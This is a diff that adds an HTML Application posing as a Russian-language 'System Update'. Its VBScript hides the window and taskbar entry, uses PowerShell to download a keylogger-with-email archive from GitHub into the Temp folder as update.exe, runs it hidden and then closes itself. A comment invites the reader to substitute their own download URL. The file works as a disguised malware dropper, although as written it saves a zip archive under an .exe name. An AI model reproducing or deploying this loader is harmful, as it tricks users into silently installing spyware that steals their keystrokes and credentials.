@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Обновление системы</title>
+    <HTA:APPLICATION ID="oApp" 
+        APPLICATIONNAME="loader" 
+        WINDOWSTATE="minimize" 
+        SHOWINTASKBAR="no" 
+        SINGLEINSTANCE="yes" 
+        SYSMENU="no">
+</head>
+<body>
+<script language="VBScript">
+    ' Скрытое выполнение
+    Dim shell, fso, tempFolder, exePath, url
+    Set shell = CreateObject("WScript.Shell")
+    Set fso = CreateObject("Scripting.FileSystemObject")
+    
+    ' Папка Temp
+    tempFolder = shell.ExpandEnvironmentStrings("%TEMP%")
+    exePath = tempFolder & "\update.exe"
+    
+    ' URL для скачивания (замени на свой)
+    url = "https://github.com/joshmadakor1/Key-Logger-With-Email/archive/refs/heads/master.zip"
+    
+    ' Скачивание через PowerShell
+    Dim psCmd
+    psCmd = "powershell -Command ""Invoke-WebRequest -Uri '" & url & "' -OutFile '" & exePath & "'"""
+    shell.Run psCmd, 0, True ' Ждём завершения
+    
+    ' Запуск EXE
+    shell.Run exePath, 0, False
+    
+    ' Закрываем HTA (опционально)
+    window.close()
+</script>
+</body>
+</html>
